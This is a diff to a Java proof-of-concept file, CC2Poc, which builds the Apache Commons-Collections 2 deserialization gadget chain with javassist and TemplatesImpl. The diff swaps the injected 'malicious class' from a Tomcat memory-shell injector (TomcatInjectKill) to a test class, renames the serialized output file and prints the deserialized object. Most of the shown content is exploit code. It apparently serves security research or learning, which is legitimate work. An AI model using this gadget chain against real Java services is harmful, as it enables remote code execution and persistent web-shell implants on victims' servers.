@@ -1,6 +1,7 @@
 package com.example.demo.Main;
 
 
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import javassist.ClassPool;
 import javassist.CtClass;
 import org.apache.commons.collections4.comparators.TransformingComparator;
@@ -27,8 +28,8 @@ public class CC2Poc {
          * TomcatInjectKill
          */
 
-        //获取恶意类字节码
-        CtClass ctClass = classPool.getCtClass("com.example.demo.Static.TomcatInjectKill");
+        //获取恶意类字节码，payload
+        CtClass ctClass = classPool.getCtClass("com.example.demo.Static.TestTemplatesImpl");
         byte[] bytes = ctClass.toBytecode();
         System.out.println(bytes);
 
@@ -78,7 +79,7 @@ public class CC2Poc {
 
         try{
             //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc11Step1.ser"));
-            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc2Step4.ser"));
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./test.ser"));
             outputStream.writeObject(queue);
             outputStream.close();
 
@@ -94,5 +95,6 @@ public class CC2Poc {
         byte[] run = Base64.getDecoder().decode(base64String);
         ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(run));
         Object object = ois.readObject();
+        System.out.println(object.toString());
     }
 }
